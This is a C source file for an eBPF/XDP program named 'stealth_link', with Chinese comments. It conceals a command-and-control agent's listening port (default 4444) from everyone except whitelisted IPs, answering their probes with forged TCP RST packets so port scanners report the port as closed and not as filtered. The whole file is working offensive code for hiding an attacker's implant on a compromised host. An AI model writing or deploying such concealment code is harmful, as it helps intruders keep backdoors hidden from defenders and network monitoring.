#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"stealth_link\","
      "\"desc\":\"XDP C2 通信隐身：隐藏 Agent 监听端口，仅允许授权 IP 连接，阻止端口扫描探测\","
      "\"requires\":[\"is_root\",\"xdp\",\"cap_net_admin\"],"
      "\"options\":{"
        "\"C2_PORT\":[\"4444\",\"Agent 监听端口（需隐藏的端口号）\"]"
      "},"
      "\"maps\":{"
        "\"c2_ports\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
        "\"allowed_ips\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
      "}"
    "}";

/*
 * 需要隐藏的 C2 端口集合（主机字节序）
 * update 格式：config[0:2]=port(u16 LE), config[2:6]=1(u32 LE)
 * 
 * 效果：非授权 IP 发往此端口的 TCP SYN 包将被静默丢弃，
 *       端口扫描器（nmap）会认为端口 filtered/closed
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 16);
    __type(key, __u16);    /* 端口号（主机字节序） */
    __type(value, __u32);  /* 占位 */
} c2_ports SEC(".maps");

/*
 * 授权连接的 IP 白名单（网络字节序的 IPv4 地址）
 * update 格式：config[0:4]=IPv4(u32 网络字节序), config[4:8]=1(u32 LE)
 * 
 * 白名单为空时：所有 IP 均可连接（不启用过滤）
 * 白名单非空时：仅白名单内的 IP 可以连接 C2 端口
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u32);    /* IPv4 地址（网络字节序） */
    __type(value, __u32);  /* 占位 */
} allowed_ips SEC(".maps");

/* 用于检测 allowed_ips 是否为空（是否启用 IP 白名单） */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);  /* 白名单中 IP 的数量 */
} whitelist_count SEC(".maps");

/* IP 校验和计算 */
static __always_inline __u16 csum_fold(__u32 sum) {
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return (__u16)~sum;
}

static __always_inline __u32 csum_add(__u32 sum, __u32 val) {
    sum += val;
    if (sum < val) sum++;
    return sum;
}

/*
 * XDP 核心逻辑 — RST 伪装模式：
 * 
 * 对未授权的 C2 端口访问，不是静默丢弃（nmap 报 filtered），
 * 而是就地构造 TCP RST 回包（nmap 报 closed）。
 * 
 * closed 看起来就像一个正常的、没有服务监听的端口，
 * 比 filtered 隐蔽得多 — filtered 暗示"有防火墙在保护什么"。
 */
SEC("xdp")
int stealth_link_xdp(struct xdp_md *ctx) {
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* ---- Layer 2: Ethernet ---- */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    /* 仅处理 IPv4 */
    if (eth->h_proto != bpf_htons(0x0800))  /* ETH_P_IP */
        return XDP_PASS;

    /* ---- Layer 3: IPv4 ---- */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* 仅处理 TCP */
    if (ip->protocol != 6)  /* IPPROTO_TCP */
        return XDP_PASS;

    /* ---- Layer 4: TCP ---- */
    struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    /* 提取目的端口（网络字节序 → 主机字节序） */
    __u16 dport = bpf_ntohs(tcp->dest);

    /* 非 C2 端口，放行 */
    if (!bpf_map_lookup_elem(&c2_ports, &dport))
        return XDP_PASS;

    /* ---- 命中 C2 端口 ---- */

    /* 白名单检查 */
    __u32 zero = 0;
    __u32 *wl_cnt = bpf_map_lookup_elem(&whitelist_count, &zero);
    if (wl_cnt && *wl_cnt > 0) {
        __u32 src_ip = ip->saddr;
        if (bpf_map_lookup_elem(&allowed_ips, &src_ip))
            return XDP_PASS;  /* 在白名单中，放行 */
    } else {
        /* 白名单未启用（无授权 IP），对所有人放行 */
        return XDP_PASS;
    }

    /* ========== 构造 TCP RST 回包（就地修改 + XDP_TX） ========== */

    /* -- Swap MAC -- */
    unsigned char tmp_mac[6];
    __builtin_memcpy(tmp_mac, eth->h_dest, 6);
    __builtin_memcpy(eth->h_dest, eth->h_source, 6);
    __builtin_memcpy(eth->h_source, tmp_mac, 6);

    /* -- Swap IP -- */
    __u32 tmp_ip = ip->saddr;
    ip->saddr = ip->daddr;
    ip->daddr = tmp_ip;
    ip->tot_len = bpf_htons(40); /* IP(20) + TCP(20), 无 payload */
    ip->ttl = 64;
    ip->check = 0;

    /* 重算 IP 校验和 */
    __u32 ip_sum = 0;
    __u16 *ip_hdr = (__u16 *)ip;
    #pragma unroll
    for (int i = 0; i < 10; i++)
        ip_sum = csum_add(ip_sum, ip_hdr[i]);
    ip->check = csum_fold(ip_sum);

    /* -- Craft TCP RST -- */
    __u16 tmp_port = tcp->source;
    tcp->source = tcp->dest;
    tcp->dest = tmp_port;

    /* ACK 号 = 对方的 SEQ + 1 */
    __u32 their_seq = bpf_ntohl(tcp->seq);
    tcp->seq = tcp->ack_seq;
    tcp->ack_seq = bpf_htonl(their_seq + 1);

    /* 清除所有 TCP flags，只设 RST + ACK */
    *((__u8 *)tcp + 13) = 0x14; /* RST=1, ACK=1 */
    tcp->doff = 5;  /* 20 bytes, 无 options */
    tcp->window = 0;
    tcp->urg_ptr = 0;
    tcp->check = 0;

    /* TCP 伪头校验和 */
    __u32 tcp_sum = 0;
    tcp_sum = csum_add(tcp_sum, ip->saddr & 0xffff);
    tcp_sum = csum_add(tcp_sum, ip->saddr >> 16);
    tcp_sum = csum_add(tcp_sum, ip->daddr & 0xffff);
    tcp_sum = csum_add(tcp_sum, ip->daddr >> 16);
    tcp_sum = csum_add(tcp_sum, bpf_htons(6));    /* IPPROTO_TCP */
    tcp_sum = csum_add(tcp_sum, bpf_htons(20));   /* TCP 段长度 */
    __u16 *tcp_hdr = (__u16 *)tcp;
    #pragma unroll
    for (int i = 0; i < 10; i++)
        tcp_sum = csum_add(tcp_sum, tcp_hdr[i]);
    tcp->check = csum_fold(tcp_sum);

    /* 截断包至 ETH+IP+TCP = 54 bytes */
    bpf_xdp_adjust_tail(ctx, (int)(sizeof(struct ethhdr) + 20 + 20) -
                              (int)(data_end - data));

    return XDP_TX;
}
